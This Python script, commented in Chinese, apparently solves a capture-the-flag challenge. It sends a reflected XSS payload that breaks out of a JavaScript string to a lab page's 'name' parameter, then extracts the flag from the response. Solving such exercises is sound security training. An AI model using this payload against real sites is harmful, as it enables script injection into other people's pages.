#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
X-059-24 XSS漏洞利用脚本

利用反射型XSS漏洞获取flag
目标：http://ip32821
"""
import sys
import re


def http_get(url, params=None, timeout=10):
    try:
        import requests  # type: ignore
        from urllib.parse import urlencode

        # 构造完整URL用于显示
        full_url = url
        if params:
            query_string = urlencode(params)
            full_url = f"{url}?{query_string}"
            print(f"[*] 完整请求URL: {full_url}")

        r = requests.get(url, params=params, headers={
            "User-Agent": "Mozilla/5.0 (X-059-24-EXP)"
        }, timeout=timeout)
        r.raise_for_status()
        return r.text
    except Exception:
        from urllib.parse import urlencode
        from urllib.request import urlopen, Request
        if params:
            query_string = urlencode(params)
            full_url = f"{url}?{query_string}"
            print(f"[*] 完整请求URL: {full_url}")
            url = full_url
        req = Request(url, headers={"User-Agent": "Mozilla/5.0 (X-059-24-EXP)"})
        with urlopen(req, timeout=timeout) as resp:  # nosec - 用户可控
            return resp.read().decode("utf-8", errors="replace")


def extract_flag(html: str):
    m = re.search(r"FLAG\{[^}]+\}", html)
    return m.group(0) if m else None


def run(base_url: str):
    """
    执行XSS漏洞利用获取flag
    """
    print(f"[*] 目标URL: {base_url}")

    # 使用已验证成功的payload
    # 原始: ";alert('XSS');a="
    # 由于requests库会自动进行URL编码，我们直接使用原始payload
    payload = '";alert("XSS");a="'

    # 构造攻击URL
    page_url = f"{base_url.rstrip('/')}/page"
    params = {"name": payload}

    print(f"[*] 使用XSS payload: {payload}")
    print(f"[*] 请求URL: {page_url}")

    try:
        html = http_get(page_url, params=params)
        flag = extract_flag(html)

        if flag:
            print(f"[+] 成功获取flag: {flag}")
            return flag
        else:
            print("[-] 未找到flag，检查响应内容")
            # 输出部分响应用于调试
            if "Congratulations!" in html:
                print("[+] 检测到成功消息，尝试重新提取flag")
                # 尝试其他flag格式
                flag_match = re.search(r"flag[:\s]*([a-zA-Z0-9_\-{}\s]+)", html, re.IGNORECASE)
                if flag_match:
                    flag = flag_match.group(1).strip()
                    print(f"[+] 提取到可能的flag: {flag}")
                    return flag
            return None

    except Exception as e:
        print(f"[-] 请求失败: {e}")
        return None


def main():
    """
    主函数，直接使用已知目标URL
    """
    print("=" * 60)
    print("X-059-24 XSS漏洞利用脚本")
    print("=" * 60)

    # 直接使用目标URL
    target_url = "http://ip32821"

    flag = run(target_url)
    if flag:
        print(f"\n[+] 漏洞利用成功!")
        print(f"[+] Flag: {flag}")
        return 0
    else:
        print("\n[-] 未能获取flag，可能目标系统不可用")
        return 1


if __name__ == '__main__':
    sys.exit(main())
